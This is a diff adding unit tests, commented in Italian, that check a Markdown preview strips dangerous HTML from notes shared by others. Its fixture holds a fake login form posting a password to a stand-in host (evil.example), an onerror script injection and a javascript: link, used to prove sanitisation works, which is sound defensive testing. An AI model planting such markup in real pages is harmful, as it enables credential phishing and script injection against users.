@@ -71,3 +71,46 @@ describe('anteprima Markdown', () => {
     expect(renderMarkdown('[sito](https://example.com)')).toContain('target="_blank"')
   })
 })
+
+describe('anteprima della nota di un\'altra persona (link condiviso)', () => {
+  const evil = [
+    '# Nota',
+    '',
+    '<form action="https://evil.example/ruba" method="post"><input name="password" type="password"><button>Accedi di nuovo</button></form>',
+    '',
+    '<style>.shared-top { display: none }</style>',
+    '',
+    '<textarea>t</textarea> <select><option>o</option></select> <dialog open>finestra</dialog>',
+    '',
+    '<img src="x" onerror="window.__rubato = 1"> <a href="javascript:alert(1)">link</a>',
+    '',
+    '- [x] fatto',
+    '- [ ] da fare',
+  ].join('\n')
+
+  it('toglie moduli, pulsanti, stili e finestre; le caselle restano ma non si cliccano', () => {
+    const html = renderMarkdown(evil, { untrusted: true })
+    const box = document.createElement('div')
+    box.innerHTML = html
+    for (const tag of ['form', 'button', 'style', 'textarea', 'select', 'dialog', 'script']) expect(box.querySelector(tag), tag).toBeNull()
+    expect(html).not.toMatch(/onerror|javascript:|password/)
+    // Anche il campo della password del modulo tolto diventa una casella spenta, senza nome.
+    const inputs = [...box.querySelectorAll('input')]
+    expect(inputs).toHaveLength(3)
+    expect(inputs.every((i) => i.type === 'checkbox' && i.disabled && !i.name)).toBe(true)
+    expect(inputs.filter((i) => i.classList.contains('task-checkbox')).map((i) => i.checked)).toEqual([true, false])
+    expect(box.querySelector('h1')?.textContent).toBe('Nota')
+  })
+
+  it('nelle proprie note le caselle si cliccano; moduli e stili non ci sono nemmeno lì', () => {
+    renderMarkdown(evil, { untrusted: true })
+    const box = document.createElement('div')
+    box.innerHTML = renderMarkdown(`- [ ] da fare\n\n<details><summary>Altro</summary>testo</details>\n\n${evil}`)
+    const tasks = [...box.querySelectorAll<HTMLInputElement>('input.task-checkbox')]
+    expect(tasks.map((i) => i.disabled)).toEqual([false, false, false])
+    expect(box.querySelector('details')).not.toBeNull()
+    for (const tag of ['form', 'button', 'style', 'textarea', 'select', 'dialog']) expect(box.querySelector(tag), tag).toBeNull()
+    const others = [...box.querySelectorAll('input:not(.task-checkbox)')]
+    expect(others.every((i) => (i as HTMLInputElement).disabled && !(i as HTMLInputElement).name)).toBe(true)
+  })
+})
